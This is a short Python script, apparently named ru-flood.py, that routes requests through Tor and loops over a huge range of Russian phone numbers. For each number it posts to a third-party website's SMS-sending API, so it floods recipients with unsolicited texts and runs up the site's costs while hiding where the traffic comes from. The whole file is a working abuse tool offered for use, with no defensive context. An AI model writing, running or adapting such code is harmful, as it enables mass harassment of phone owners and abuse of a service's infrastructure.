#!/usr/bin/python3
# ./ru-flood.py 79000000000 80000000000

import requests
from random import random
from time import sleep
from sys import argv

def get_tor_session():
    session = requests.session()
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

session = get_tor_session()

def flood(phone):
    text = "текст\n\n"
    url = f"https://elis.ru/api/sms/sendSms/{text}/{phone}/"

    response = session.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
    print(phone + ":" + response.content.decode())

for i in range(int(argv[1]), int(argv[2])):
    flood(str(i))
